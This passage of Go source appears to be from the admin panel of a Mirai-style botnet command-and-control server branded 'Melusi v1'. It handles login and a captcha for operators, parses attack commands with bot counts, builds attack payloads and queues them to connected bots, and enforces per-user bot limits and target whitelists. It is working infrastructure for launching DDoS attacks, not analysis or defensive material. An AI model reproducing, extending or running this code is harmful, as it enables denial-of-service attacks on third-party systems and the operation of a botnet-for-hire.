		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		/*
			if cmd[0] == '@' {
				cataSplit := strings.SplitN(cmd, " ", 2)
				botCatagory = cataSplit[0][1:]
				cmd = cataSplit[1]
			}*/

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 1); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
					if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
						YotCount = userInfo.maxBots
					} else {
						YotCount = clientList.Count()
					}
					this.conn.Write([]byte(fmt.Sprintf("\033[0;96m[+] Attack Has Been sent \033[0;32m%d \033[0;96mbots [+]\r\n", YotCount)))
				} else {
					fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	this.conn.SetDeadline(time.Now().Add(10 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033]0;fbi.gov\007")))

	question, answer, err := genMathCaptcha()
	this.conn.Write([]byte("\r\nCaptcha: " + question + "\r\n"))

	captchaInput, err := this.ReadLine(false)
	if err != nil {
		return
	}

	if captchaInput != answer {
		this.conn.Write([]byte("Incorrect answer.\r\n"))
		return
	}

	/*if !strings.ContainsAny(loginkey, "start") {
		return
	}*/

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(fmt.Sprintf("\033]0;melusi.gov\007")))
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╔╦╗╔═╗╦  \x1b[1;32m╦ ╦╔═╗╦                \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ║║║║╣ ║  \x1b[1;32m║ ║╚═╗║                \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╩ ╩╚═╝╩═╝\x1b[1;32m╚═╝╚═╝╩                \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                👾 We Are \x1b[1;32mLeaders 👾             \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╔═════════════════════════\x1b[1;32m══════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║- - - - - - - Welcome To \x1b[1;32mMelusi v1 - - - - - - ║\r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║  - - - - - Please Login \x1b[1;32mTo Proceed - - - - -  ║\r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╚═════════════════════════\x1b[1;32m══════════════════════╝\r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ╔══════════════════════\x1b[1;32m═══════════════════╗   \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ║- - - - - Anti Crash: \x1b[1;32mENABLED - - - - - -║   \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ║- - - - - Anti Brute: \x1b[1;32mENABLED - - - - - -║   \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ╚══════════════════════\x1b[1;32m═══════════════════╝   \r\n"))
	this.conn.Write([]byte("\x1b[0m\x1b[1;96m\r\n"))
	this.conn.Write([]byte("\x1b[1;96mUserAuth:\x1b[1;32m: \x1b[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(fmt.Sprintf("\033]0;melusi.gov\007")))
	this.conn.Write([]byte("\x1b[1;32mPassAuth:\x1b[1;32m: \x1b[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[00;96mFailed! \r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if sessionExists(username) == true {
		this.conn.Write([]byte("\r\033[00;31mSharing Detected. \r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	fmt.Println("Session created for:", username)
	addSession(username)

	if sessionExists(username) == true {
		fmt.Println("created successfully")
	} else {
		fmt.Println("created unsuccessfully")
	}

	handlePanel(this, username, password, userInfo)
	sessionRemove(username)
	fmt.Println(username, "has been disconnected, session terminated.")
}

func (this *Admin) ReadLine(masked bool) (string, error) {

	buf := make([]byte, 1000)
	bufPos := 0

	for {

		if len(buf) < bufPos+2 {
			fmt.Println("BUFF LEN:", len(buf))
			fmt.Println("Prevented Buffer Overflow.", this.conn.RemoteAddr())
			WriteLog("cnc-log.txt", []byte(time.Now().Format("2006-01-02 15:04:05")+"  Prevented a buffer overflow from:"+this.conn.RemoteAddr().String()))
			return string(buf), nil
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
